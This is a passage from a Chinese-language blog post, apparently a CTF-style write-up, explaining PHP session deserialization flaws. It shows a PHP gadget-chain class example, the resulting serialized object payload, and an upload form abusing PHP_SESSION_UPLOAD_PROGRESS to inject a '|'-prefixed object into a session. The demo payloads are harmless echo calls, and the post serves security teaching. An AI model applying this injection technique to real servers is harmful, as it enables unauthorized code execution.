class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$obj</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'1234567890'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">obj</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">foo3</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__toString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">obj</span><span class="crayon-o">-&gt;</span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-20">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc22017402856-21"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">foo1</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-v">$varr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">varr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">foo2</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-26"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-28">&nbsp;</div><div class="crayon-line" id="crayon-58150e20dfc22017402856-29"><span class="crayon-v">$obj</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">foo1</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc22017402856-30"><span class="crayon-e">print_r</span><span class="crayon-sy">(</span><span class="crayon-e">serialize</span><span class="crayon-sy">(</span><span class="crayon-v">$obj</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc22017402856-31"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0049 seconds] -->
+    <p>在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为<code>echo "spoock"</code>。最终得到的序列话的值是</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc25860739980" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc25860739980-1">1</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc25860739980-1"><span class="crayon-v">O</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"foo1"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"varr"</span><span class="crayon-sy">;</span><span class="crayon-v">O</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"foo2"</span><span class="crayon-o">:</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"varr"</span><span class="crayon-sy">;</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">10</span><span class="crayon-o">:</span><span class="crayon-s">"1234567890"</span><span class="crayon-sy">;</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">3</span><span class="crayon-o">:</span><span class="crayon-s">"obj"</span><span class="crayon-sy">;</span><span class="crayon-v">O</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"foo3"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-o">:</span><span class="crayon-s">"varr"</span><span class="crayon-sy">;</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">14</span><span class="crayon-o">:</span><span class="crayon-s">"echo "</span><span class="crayon-i">spoock</span><span class="crayon-s">";"</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0016 seconds] -->
+    <p>这样当上面的序列话的值写入到服务器端，然后再访问服务器的index.php，最终就会执行我们预先定义的<code>echo "spoock";</code>的方法了。<br />
+        写入的方式主要是利用PHP中<a href="http://php.net/manual/en/session.upload-progress.php" target="_blank" rel="external">Session Upload Progress</a>来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc28091906782" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;form action="index.php" method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt;
+    &lt;input type="file" name="file" /&gt;
+    &lt;input type="submit" /&gt;
+&lt;/form&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc28091906782-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc28091906782-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc28091906782-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc28091906782-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc28091906782-5">5</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc28091906782-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"index.php"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc28091906782-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"123"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-58150e20dfc28091906782-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"file"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"file"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc28091906782-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"submit"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-58150e20dfc28091906782-5"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">form</span><span class="crayon-o">&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0014 seconds] -->
+    <p>最后就会将文件名写入到session中，具体的实现细节可以参考PHP手册。<br />
+        那么最终写入的文件名是<code>|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:12:"var_dump(1);";}}}</code>。注意与本地反序列化不一样的地方是要在最前方加上<strong>|</strong><br />
+        但是我在进行本地测试的时候，发现无法实现安恒这道题目所实现的效果，但是最终的原理是一样的。</p>
+    <h3 id="总结">总结</h3>
+    <p>通过对PHP中的SESSION的分析，对PHP中的SESSION的实现原理有了更加深刻的认识。这个PHP的SESSION问题也是一个很好的问题。上述的这篇文章不仅使大家PHP中的SESSION的序列化漏洞有一个认识，也有助于程序员加强在PHP中的SESSION机制的理解。</p>
+    <h3 id="参考">参考</h3>
+    <p>PHP Session 序列化及反序列化处理器：<a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">http://drops.wooyun.org/tips/3909</a><br />
+        PHP序列化与反序列化解读：<a href="http://www.freebuf.com/articles/web/90837.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/90837.html</a><br />
+        php序列化：<a href="http://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html</a><br />
+        Joomla远程代码执行漏洞分析（总结）：<a href="https://www.leavesongs.com/?keyword=Joomla" target="_blank" rel="external">https://www.leavesongs.com/?keyword=Joomla</a><br />
+        web3 session反序列化：<a href="http://www.math1as.com/index.php/archives/227/" target="_blank" rel="external">http://www.math1as.com/index.php/archives/227/</a></p>
+
+
+
+
+    <div class="post-adds">
+        <span data-post-id="107052" class=" btn-bluet-bigger href-style vote-post-up   register-user-only "><i class="fa  fa-thumbs-o-up"></i> <h10 id="107052votetotal">1</h10> 赞</span>
+        <span data-book-type="1" data-site-id="2" data-item-id="107052" data-item-type="1" class=" btn-bluet-bigger href-style bookmark-btn  register-user-only "><i class="fa fa-bookmark-o  "></i> 2 收藏</span>
+
+        <a href="#article-comment"><span class="btn-bluet-bigger href-style hide-on-480"><i class="fa fa-comments-o"></i>  评论</span></a>
+
+
+
+        <!-- JiaThis Button BEGIN -->
+        <div class="jiathis_style_24x24" style="display: inline-flex; position: relative; margin: 0; clear: both;float: right;">
+            <a class="jiathis_button_tsina"></a>
+            <a class="jiathis_button_weixin"></a>
+            <a class="jiathis_button_qzone"></a>
+            <a class="jiathis_button_fb hide-on-480"></a>
+            <a href="http://www.jiathis.com/share?uid=1745061" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+        </div>
+
+    </div>
